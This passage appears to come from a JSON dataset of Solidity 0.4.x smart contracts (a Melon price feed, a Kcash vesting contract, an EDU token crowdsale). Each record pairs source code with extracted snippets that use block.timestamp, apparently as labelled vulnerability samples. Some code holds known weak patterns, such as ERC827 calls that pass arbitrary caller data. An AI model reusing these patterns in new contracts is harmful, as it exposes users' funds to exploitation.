pre_cond(stakeToWithdraw[msg.sender] > 0)\n pre_cond(block.timestamp >= latestUnstakeTime[msg.sender] + withdrawalDelay)\n {\n uint amount = stakeToWithdraw[msg.sender];\n stakeToWithdraw[msg.sender] = 0;\n require(stakingToken.transfer(msg.sender, amount));\n }\n function isValidNode(uint id) view returns (bool) {\n return id != 0 && (id == stakeNodes[0].next || stakeNodes[id].prev != 0);\n }\n function searchNode(address staker) view returns (uint) {\n uint current = stakeNodes[0].next;\n while (isValidNode(current)) {\n if (staker == stakeNodes[current].data.staker) {\n return current;\n }\n current = stakeNodes[current].next;\n }\n return 0;\n }\n function isOperator(address user) view returns (bool) {\n address[] memory operators = getOperators();\n for (uint i; i < operators.length; i++) {\n if (operators[i] == user) {\n return true;\n }\n }\n return false;\n }\n function getOperators()\n view\n returns (address[])\n {\n uint arrLength = (numOperators > numStakers) ?\n numStakers :\n numOperators;\n address[] memory operators = new address[](arrLength);\n uint current = stakeNodes[0].next;\n for (uint i; i < arrLength; i++) {\n operators[i] = stakeNodes[current].data.staker;\n current = stakeNodes[current].next;\n }\n return operators;\n }\n function getStakersAndAmounts()\n view\n returns (address[], uint[])\n {\n address[] memory stakers = new address[](numStakers);\n uint[] memory amounts = new uint[](numStakers);\n uint current = stakeNodes[0].next;\n for (uint i; i < numStakers; i++) {\n stakers[i] = stakeNodes[current].data.staker;\n amounts[i] = stakeNodes[current].data.amount;\n current = stakeNodes[current].next;\n }\n return (stakers, amounts);\n }\n function totalStakedFor(address user)\n view\n returns (uint)\n {\n return stakedAmounts[user];\n }\n function insertNodeSorted(uint amount, address staker) internal returns (uint) {\n uint current = stakeNodes[0].next;\n if (current == 0) return insertNodeAfter(0, amount, staker);\n while (isValidNode(current)) {\n if (amount > stakeNodes[current].data.amount) {\n break;\n }\n current = stakeNodes[current].next;\n }\n return insertNodeBefore(current, amount, staker);\n }\n function insertNodeAfter(uint id, uint amount, address staker) internal returns (uint newID) {\n require(id == 0 || isValidNode(id));\n Node storage node = stakeNodes[id];\n stakeNodes.push(Node({\n data: StakeData(amount, staker),\n prev: id,\n next: node.next\n }));\n newID = stakeNodes.length - 1;\n stakeNodes[node.next].prev = newID;\n node.next = newID;\n numStakers++;\n }\n function insertNodeBefore(uint id, uint amount, address staker) internal returns (uint) {\n return insertNodeAfter(stakeNodes[id].prev, amount, staker);\n }\n function removeNode(uint id) internal {\n require(isValidNode(id));\n Node storage node = stakeNodes[id];\n stakeNodes[node.next].prev = node.prev;\n stakeNodes[node.prev].next = node.next;\n delete stakeNodes[id];\n numStakers--;\n }\n function updateStakerRanking(address _staker) internal {\n uint newStakedAmount = stakedAmounts[_staker];\n if (newStakedAmount == 0) {\n isRanked[_staker] = false;\n removeStakerFromArray(_staker);\n } else if (isRanked[_staker]) {\n removeStakerFromArray(_staker);\n insertNodeSorted(newStakedAmount, _staker);\n } else {\n isRanked[_staker] = true;\n insertNodeSorted(newStakedAmount, _staker);\n }\n }\n function removeStakerFromArray(address _staker) internal {\n uint id = searchNode(_staker);\n require(id > 0);\n removeNode(id);\n }\n}\ncontract CanonicalPriceFeed is OperatorStaking, SimplePriceFeed, CanonicalRegistrar {\n event SetupPriceFeed(address ofPriceFeed);\n struct HistoricalPrices {\n address[] assets;\n uint[] prices;\n uint timestamp;\n }\n bool public updatesAreAllowed = true;\n uint public minimumPriceCount = 1;\n uint public VALIDITY;\n uint public INTERVAL;\n mapping (address => bool) public isStakingFeed;\n HistoricalPrices[] public priceHistory;\n function CanonicalPriceFeed(\n address ofStakingAsset,\n address ofQuoteAsset,\n bytes32 quoteAssetName,\n bytes8 quoteAssetSymbol,\n uint quoteAssetDecimals,\n string quoteAssetUrl,\n string quoteAssetIpfsHash,\n address[2] quoteAssetBreakInBreakOut,\n uint[] quoteAssetStandards,\n bytes4[] quoteAssetFunctionSignatures,\n uint[2] updateInfo,\n uint[3] stakingInfo,\n address ofGovernance\n )\n OperatorStaking(\n AssetInterface(ofStakingAsset), stakingInfo[0], stakingInfo[1], stakingInfo[2]\n )\n SimplePriceFeed(address(this), ofQuoteAsset, address(0))\n {\n registerAsset(\n ofQuoteAsset,\n quoteAssetName,\n quoteAssetSymbol,\n quoteAssetDecimals,\n quoteAssetUrl,\n quoteAssetIpfsHash,\n quoteAssetBreakInBreakOut,\n quoteAssetStandards,\n quoteAssetFunctionSignatures\n );\n INTERVAL = updateInfo[0];\n VALIDITY = updateInfo[1];\n setOwner(ofGovernance);\n }\n function setupStakingPriceFeed() external {\n address ofStakingPriceFeed = new StakingPriceFeed(\n address(this),\n stakingToken,\n address(this)\n );\n isStakingFeed[ofStakingPriceFeed] = true;\n StakingPriceFeed(ofStakingPriceFeed).setOwner(msg.sender);\n emit SetupPriceFeed(ofStakingPriceFeed);\n }\n function update() external { revert(); }\n function burnStake(address user)\n external\n auth\n {\n uint totalToBurn = add(stakedAmounts[user], stakeToWithdraw[user]);\n stakedAmounts[user] = 0;\n stakeToWithdraw[user] = 0;\n updateStakerRanking(user);\n emit StakeBurned(user, totalToBurn, \"\");\n }\n function stake(\n uint amount,\n bytes data\n )\n public\n pre_cond(isStakingFeed[msg.sender])\n {\n OperatorStaking.stake(amount, data);\n }\n function collectAndUpdate(address[] ofAssets)\n public\n auth\n pre_cond(updatesAreAllowed)\n {\n uint[] memory newPrices = pricesToCommit(ofAssets);\n priceHistory.push(\n HistoricalPrices({assets: ofAssets, prices: newPrices, timestamp: block.timestamp})\n );\n _updatePrices(ofAssets, newPrices);\n }\n function pricesToCommit(address[] ofAssets)\n view\n returns (uint[])\n {\n address[] memory operators = getOperators();\n uint[] memory newPrices = new uint[](ofAssets.length);\n for (uint i = 0; i < ofAssets.length; i++) {\n uint[] memory assetPrices = new uint[](operators.length);\n for (uint j = 0; j < operators.length; j++) {\n SimplePriceFeed feed = SimplePriceFeed(operators[j]);\n var (price, timestamp) = feed.assetsToPrices(ofAssets[i]);\n if (now > add(timestamp, VALIDITY)) {\n continue;\n }\n assetPrices[j] = price;\n }\n newPrices[i] = medianize(assetPrices);\n }\n return newPrices;\n }\n function medianize(uint[] unsorted)\n view\n returns (uint)\n {\n uint numValidEntries;\n for (uint i = 0; i < unsorted.length; i++) {\n if (unsorted[i] != 0) {\n numValidEntries++;\n }\n }\n if (numValidEntries < minimumPriceCount) {\n revert();\n }\n uint counter;\n uint[] memory out = new uint[](numValidEntries);\n for (uint j = 0; j < unsorted.length; j++) {\n uint item = unsorted[j];\n if (item != 0) {\n if (counter == 0 || item >= out[counter - 1]) {\n out[counter] = item;\n } else {\n uint k = 0;\n while (item >= out[k]) {\n k++;\n }\n for (uint l = counter; l > k; l--) {\n out[l] = out[l - 1];\n }\n out[k] = item;\n }\n counter++;\n }\n }\n uint value;\n if (counter % 2 == 0) {\n uint value1 = uint(out[(counter / 2) - 1]);\n uint value2 = uint(out[(counter / 2)]);\n value = add(value1, value2) / 2;\n } else {\n value = out[(counter - 1) / 2];\n }\n return value;\n }\n function setMinimumPriceCount(uint newCount) auth { minimumPriceCount = newCount; }\n function enableUpdates() auth { updatesAreAllowed = true; }\n function disableUpdates() auth { updatesAreAllowed = false; }\n function getQuoteAsset() view returns (address) { return QUOTE_ASSET; }\n function getInterval() view returns (uint) { return INTERVAL; }\n function getValidity() view returns (uint) { return VALIDITY; }\n function getLastUpdateId() view returns (uint) { return updateId; }\n function hasRecentPrice(address ofAsset)\n view\n pre_cond(assetIsRegistered(ofAsset))\n returns (bool isRecent)\n {\n var ( , timestamp) = getPrice(ofAsset);\n return (sub(now, timestamp) <= VALIDITY);\n }\n function hasRecentPrices(address[] ofAssets)\n view\n returns (bool areRecent)\n {\n for (uint i; i < ofAssets.length; i++) {\n if (!hasRecentPrice(ofAssets[i])) {\n return false;\n }\n }\n return true;\n }\n function getPriceInfo(address ofAsset)\n view\n returns (bool isRecent, uint price, uint assetDecimals)\n {\n isRecent = hasRecentPrice(ofAsset);\n (price, ) = getPrice(ofAsset);\n assetDecimals = getDecimals(ofAsset);\n }\n function getInvertedPriceInfo(address ofAsset)\n view\n returns (bool isRecent, uint invertedPrice, uint assetDecimals)\n {\n uint inputPrice;\n (isRecent, inputPrice, assetDecimals) = getPriceInfo(ofAsset);\n uint quoteDecimals = getDecimals(QUOTE_ASSET);\n return (\n isRecent,\n mul(10 ** uint(quoteDecimals), 10 ** uint(assetDecimals)) / inputPrice,\n quoteDecimals\n );\n }\n function getReferencePriceInfo(address ofBase, address ofQuote)\n view\n returns (bool isRecent, uint referencePrice, uint decimal)\n {\n if (getQuoteAsset() == ofQuote) {\n (isRecent, referencePrice, decimal) = getPriceInfo(ofBase);\n } else if (getQuoteAsset() == ofBase) {\n (isRecent, referencePrice, decimal) = getInvertedPriceInfo(ofQuote);\n } else {\n revert();\n }\n }\n function getOrderPriceInfo(\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n )\n view\n returns (uint orderPrice)\n {\n return mul(buyQuantity, 10 ** uint(getDecimals(sellAsset))) / sellQuantity;\n }\n function existsPriceOnAssetPair(address sellAsset, address buyAsset)\n view\n returns (bool isExistent)\n {\n return\n hasRecentPrice(sellAsset) &&\n hasRecentPrice(buyAsset) &&\n (buyAsset == QUOTE_ASSET || sellAsset == QUOTE_ASSET) &&\n (buyAsset != QUOTE_ASSET || sellAsset != QUOTE_ASSET);\n }\n function getPriceFeedsByOwner(address _owner)\n view\n returns(address[])\n {\n address[] memory ofPriceFeeds = new address[](numStakers);\n if (numStakers == 0) return ofPriceFeeds;\n uint current = stakeNodes[0].next;\n for (uint i; i < numStakers; i++) {\n StakingPriceFeed stakingFeed = StakingPriceFeed(stakeNodes[current].data.staker);\n if (stakingFeed.owner() == _owner) {\n ofPriceFeeds[i] = address(stakingFeed);\n }\n current = stakeNodes[current].next;\n }\n return ofPriceFeeds;\n }\n function getHistoryLength() returns (uint) { return priceHistory.length; }\n function getHistoryAt(uint id) returns (address[], uint[], uint) {\n address[] memory assets = priceHistory[id].assets;\n uint[] memory prices = priceHistory[id].prices;\n uint timestamp = priceHistory[id].timestamp;\n return (assets, prices, timestamp);\n }\n}\ninterface VersionInterface {\n event FundUpdated(uint id);\n function shutDown() external;\n function setupFund(\n bytes32 ofFundName,\n address ofQuoteAsset,\n uint ofManagementFee,\n uint ofPerformanceFee,\n address ofCompliance,\n address ofRiskMgmt,\n address[] ofExchanges,\n address[] ofDefaultAssets,\n uint8 v,\n bytes32 r,\n bytes32 s\n );\n function shutDownFund(address ofFund);\n function getNativeAsset() view returns (address);\n function getFundById(uint withId) view returns (address);\n function getLastFundId() view returns (uint);\n function getFundByManager(address ofManager) view returns (address);\n function termsAndConditionsAreSigned(uint8 v, bytes32 r, bytes32 s) view returns (bool signed);\n}\ncontract Version is DBC, Owned, VersionInterface {\n bytes32 public constant TERMS_AND_CONDITIONS = 0xAA9C907B0D6B4890E7225C09CBC16A01CB97288840201AA7CDCB27F4ED7BF159;\n string public VERSION_NUMBER;\n address public MELON_ASSET;\n address public NATIVE_ASSET;\n address public GOVERNANCE;\n address public CANONICAL_PRICEFEED;\n bool public isShutDown;\n address public COMPLIANCE;\n address[] public listOfFunds;\n mapping (address => address) public managerToFunds;\n event FundUpdated(address ofFund);\n function Version(\n string versionNumber,\n address ofGovernance,\n address ofMelonAsset,\n address ofNativeAsset,\n address ofCanonicalPriceFeed,\n address ofCompetitionCompliance\n ) {\n VERSION_NUMBER = versionNumber;\n GOVERNANCE = ofGovernance;\n MELON_ASSET = ofMelonAsset;\n NATIVE_ASSET = ofNativeAsset;\n CANONICAL_PRICEFEED = ofCanonicalPriceFeed;\n COMPLIANCE = ofCompetitionCompliance;\n }\n function shutDown() external pre_cond(msg.sender == GOVERNANCE) { isShutDown = true; }\n function setupFund(\n bytes32 ofFundName,\n address ofQuoteAsset,\n uint ofManagementFee,\n uint ofPerformanceFee,\n address ofCompliance,\n address ofRiskMgmt,\n address[] ofExchanges,\n address[] ofDefaultAssets,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) {\n require(!isShutDown);\n require(termsAndConditionsAreSigned(v, r, s));\n require(CompetitionCompliance(COMPLIANCE).isCompetitionAllowed(msg.sender));\n require(managerToFunds[msg.sender] == address(0));\n address[] memory melonAsDefaultAsset = new address[](1);\n melonAsDefaultAsset[0] = MELON_ASSET;\n address ofFund = new Fund(\n msg.sender,\n ofFundName,\n NATIVE_ASSET,\n 0,\n 0,\n COMPLIANCE,\n ofRiskMgmt,\n CANONICAL_PRICEFEED,\n ofExchanges,\n melonAsDefaultAsset\n );\n listOfFunds.push(ofFund);\n managerToFunds[msg.sender] = ofFund;\n emit FundUpdated(ofFund);\n }\n function shutDownFund(address ofFund)\n pre_cond(isShutDown || managerToFunds[msg.sender] == ofFund)\n {\n Fund fund = Fund(ofFund);\n delete managerToFunds[msg.sender];\n fund.shutDown();\n emit FundUpdated(ofFund);\n }\n function termsAndConditionsAreSigned(uint8 v, bytes32 r, bytes32 s) view returns (bool signed) {\n return ecrecover(\n keccak256(\"\\x19Ethereum Signed Message:\\n32\", TERMS_AND_CONDITIONS),\n v,\n r,\n s\n ) == msg.sender;\n }\n function getNativeAsset() view returns (address) { return NATIVE_ASSET; }\n function getFundById(uint withId) view returns (address) { return listOfFunds[withId]; }\n function getLastFundId() view returns (uint) { return listOfFunds.length - 1; }\n function getFundByManager(address ofManager) view returns (address) { return managerToFunds[ofManager]; }\n}",
  "extract_feature": [
    "function orderExpired(address ofExchange, address ofAsset) view returns (bool) {\nuint expiryTime = exchangesToOpenMakeOrders[ofExchange][ofAsset].expiresAt;\nrequire(expiryTime > 0);\nreturn block.timestamp >= expiryTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f30"
  },
  "filename": "7330.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract KcashVesting is Ownable {\n using SafeMath for uint256;\n address public teamWallet;\n address public earlyWallet;\n address public institutionWallet;\n uint256 public teamTimeLock = 1000 days;\n uint256 public earlyTimeLock = 5 * 30 days;\n uint256 public institutionTimeLock = 50 * 30 days;\n uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);\n uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);\n uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);\n uint256 public teamStageSetting = 34;\n uint256 public earlyStageSetting = 5;\n uint256 public institutionStageSetting = 50;\n ERC20Basic public token;\n uint256 public start;\n uint256 public lockStartTime;\n mapping(address => uint256) public allocations;\n mapping(address => uint256) public stageSettings;\n mapping(address => uint256) public timeLockDurations;\n mapping(address => uint256) public releasedAmounts;\n modifier onlyReserveWallets {\n require(allocations[msg.sender] > 0);\n _;\n }\n function KcashVesting(ERC20Basic _token,\n address _teamWallet,\n address _earlyWallet,\n address _institutionWallet,\n uint256 _start,\n uint256 _lockTime)public{\n require(_start > 0);\n require(_lockTime > 0);\n require(_start.add(_lockTime) > 0);\n require(_teamWallet != address(0));\n require(_earlyWallet != address(0));\n require(_institutionWallet != address(0));\n token = _token;\n teamWallet = _teamWallet;\n earlyWallet = _earlyWallet;\n institutionWallet = _institutionWallet;\n start = _start;\n lockStartTime = start.add(_lockTime);\n }\n function allocateToken() onlyOwner public{\n require(block.timestamp > lockStartTime);\n require(allocations[teamWallet] == 0);\n require(token.balanceOf(address(this)) >= totalAllocation);\n allocations[teamWallet] = teamAllocation;\n allocations[earlyWallet] = earlyAllocation;\n allocations[institutionWallet] = institutionAllocation;\n stageSettings[teamWallet] = teamStageSetting;\n stageSettings[earlyWallet] = earlyStageSetting;\n stageSettings[institutionWallet] = institutionStageSetting;\n timeLockDurations[teamWallet] = teamTimeLock;\n timeLockDurations[earlyWallet] = earlyTimeLock;\n timeLockDurations[institutionWallet] = institutionTimeLock;\n }\n function releaseToken() onlyReserveWallets public{\n uint256 totalUnlocked = unlockAmount();\n require(totalUnlocked <= allocations[msg.sender]);\n require(releasedAmounts[msg.sender] < totalUnlocked);\n uint256 payment = totalUnlocked.sub(releasedAmounts[msg.sender]);\n releasedAmounts[msg.sender] = totalUnlocked;\n require(token.transfer(msg.sender, payment));\n }\n function unlockAmount() public view onlyReserveWallets returns(uint256){\n uint256 stage = vestStage();\n uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);\n return totalUnlocked;\n }\n function vestStage() public view onlyReserveWallets returns(uint256){\n uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\n uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\n if(stage > stageSettings[msg.sender]){\n stage = stageSettings[msg.sender];\n }\n return stage;\n }\n}",
  "extract_feature": [
    "function allocateToken() onlyOwner public{\nrequire(block.timestamp > lockStartTime);\nrequire(allocations[teamWallet] == 0);\nrequire(token.balanceOf(address(this)) >= totalAllocation);\nallocations[teamWallet] = teamAllocation;\nallocations[earlyWallet] = earlyAllocation;\nallocations[institutionWallet] = institutionAllocation;\nstageSettings[teamWallet] = teamStageSetting;\nstageSettings[earlyWallet] = earlyStageSetting;\nstageSettings[institutionWallet] = institutionStageSetting;\ntimeLockDurations[teamWallet] = teamTimeLock;\ntimeLockDurations[earlyWallet] = earlyTimeLock;\ntimeLockDurations[institutionWallet] = institutionTimeLock;\n}",
    "function vestStage() public view onlyReserveWallets returns(uint256){\nuint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);\nuint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);\nif(stage > stageSettings[msg.sender]){\nstage = stageSettings[msg.sender];\n}\nreturn stage;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f31"
  },
  "filename": "7334.sol",
  "content": "pragma solidity ^0.4.13;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Certifiable is Ownable {\n Certifier public certifier;\n event CertifierChanged(address indexed newCertifier);\n constructor(address _certifier) public {\n certifier = Certifier(_certifier);\n }\n function updateCertifier(address _address) public onlyOwner returns (bool success) {\n require(_address != address(0));\n emit CertifierChanged(_address);\n certifier = Certifier(_address);\n return true;\n }\n}\ncontract KYCToken is Certifiable {\n mapping(address => bool) public kycPending;\n mapping(address => bool) public managers;\n event ManagerAdded(address indexed newManager);\n event ManagerRemoved(address indexed removedManager);\n modifier onlyManager() {\n require(managers[msg.sender] == true);\n _;\n }\n modifier isKnownCustomer(address _address) {\n require(!kycPending[_address] || certifier.certified(_address));\n if (kycPending[_address]) {\n kycPending[_address] = false;\n }\n _;\n }\n constructor(address _certifier) public Certifiable(_certifier)\n {\n }\n function addManager(address _address) external onlyOwner {\n managers[_address] = true;\n emit ManagerAdded(_address);\n }\n function removeManager(address _address) external onlyOwner {\n managers[_address] = false;\n emit ManagerRemoved(_address);\n }\n}\ncontract Certifier {\n event Confirmed(address indexed who);\n event Revoked(address indexed who);\n function certified(address) public constant returns (bool);\n function get(address, string) public constant returns (bytes32);\n function getAddress(address, string) public constant returns (address);\n function getUint(address, string) public constant returns (uint);\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract AllowanceCrowdsale is Crowdsale {\n using SafeMath for uint256;\n address public tokenWallet;\n function AllowanceCrowdsale(address _tokenWallet) public {\n require(_tokenWallet != address(0));\n tokenWallet = _tokenWallet;\n }\n function remainingTokens() public view returns (uint256) {\n return token.allowance(tokenWallet, this);\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transferFrom(tokenWallet, _beneficiary, _tokenAmount);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract ERC827 is ERC20 {\n function approveAndCall( address _spender, uint256 _value, bytes _data) public payable returns (bool);\n function transferAndCall( address _to, uint256 _value, bytes _data) public payable returns (bool);\n function transferFromAndCall(\n address _from,\n address _to,\n uint256 _value,\n bytes _data\n )\n public\n payable\n returns (bool);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call.value(msg.value)(_data));\n return true;\n }\n function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call.value(msg.value)(_data));\n return true;\n }\n function transferFromAndCall(\n address _from,\n address _to,\n uint256 _value,\n bytes _data\n )\n public payable returns (bool)\n {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call.value(msg.value)(_data));\n return true;\n }\n function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call.value(msg.value)(_data));\n return true;\n }\n function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call.value(msg.value)(_data));\n return true;\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract EDUToken is BurnableToken, KYCToken, ERC827Token {\n using SafeMath for uint256;\n string public constant name = \"EDU Token\";\n string public constant symbol = \"EDU\";\n uint8 public constant decimals = 18;\n uint256 public constant INITIAL_SUPPLY = 48000000 * (10 ** uint256(decimals));\n constructor(address _certifier) public KYCToken(_certifier) {\n totalSupply_ = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n emit Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n function transfer(address _to, uint256 _value) public isKnownCustomer(msg.sender) returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public isKnownCustomer(_from) returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public isKnownCustomer(_spender) returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public isKnownCustomer(_spender) returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public isKnownCustomer(_spender) returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n function delayedTransferFrom(address _tokenWallet, address _to, uint256 _value) public onlyManager returns (bool) {\n transferFrom(_tokenWallet, _to, _value);\n kycPending[_to] = true;\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n function CappedCrowdsale(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract EDUCrowdsale is AllowanceCrowdsale, CappedCrowdsale, TimedCrowdsale, Ownable, Certifiable {\n using SafeMath for uint256;\n uint256 constant FIFTY_ETH = 50 * (10 ** 18);\n uint256 constant HUNDRED_AND_FIFTY_ETH = 150 * (10 ** 18);\n uint256 constant TWO_HUNDRED_AND_FIFTY_ETH = 250 * (10 ** 18);\n uint256 constant TEN_ETH = 10 * (10 ** 18);\n EDUToken public token;\n event TokenWalletChanged(address indexed 